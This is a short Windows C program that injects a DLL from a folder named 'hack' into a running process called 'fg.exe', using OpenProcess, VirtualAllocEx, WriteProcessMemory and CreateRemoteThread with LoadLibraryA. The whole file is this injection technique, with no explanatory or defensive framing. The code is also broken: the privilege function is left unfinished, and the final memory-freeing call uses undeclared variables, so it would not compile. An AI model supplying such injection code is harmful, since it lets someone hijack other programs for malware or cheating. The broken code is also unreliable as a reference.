#include <stdio.h>
#include <Windows.h>
#include <Tlhelp32.h>

BOOL EnableDebugPrivilege() {
	HANDLE TokenHandle = NULL;
	TOKEN_PRIVILEGES TokenPrivilege;
	LUID uid;
	//打开权限令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle)) {
		printf("[-] Failed to OpenProcessToken. Error: %d\n", GetLastError());
		return false;
	}
}

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}

char path[] = "C:\\users\\hack\\desktop\\test\\Dll.dll";

int main()
{

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetProcessIdByName((LPCTSTR)"fg.exe"));
	if (hProcess == NULL) {
		printf("[-] Failed to OpenProcess. Error: %d\n", GetLastError());
		return -1;
	}

	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL) {
		printf("[-] Failed to VirtualAllocEx. Error: %d\n", GetLastError());
		return -1;
	}
	WriteProcessMemory(hProcess, lpBaseAddress, path, sizeof(path), NULL);
	LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, 0, 0);
	VirtualFreeEx(hTatgetProcessHandle, pRemoteAddress, ulDllLength, MEM_DECOMMIT);
  CloseHandle(hProcess);
	return 0;
}
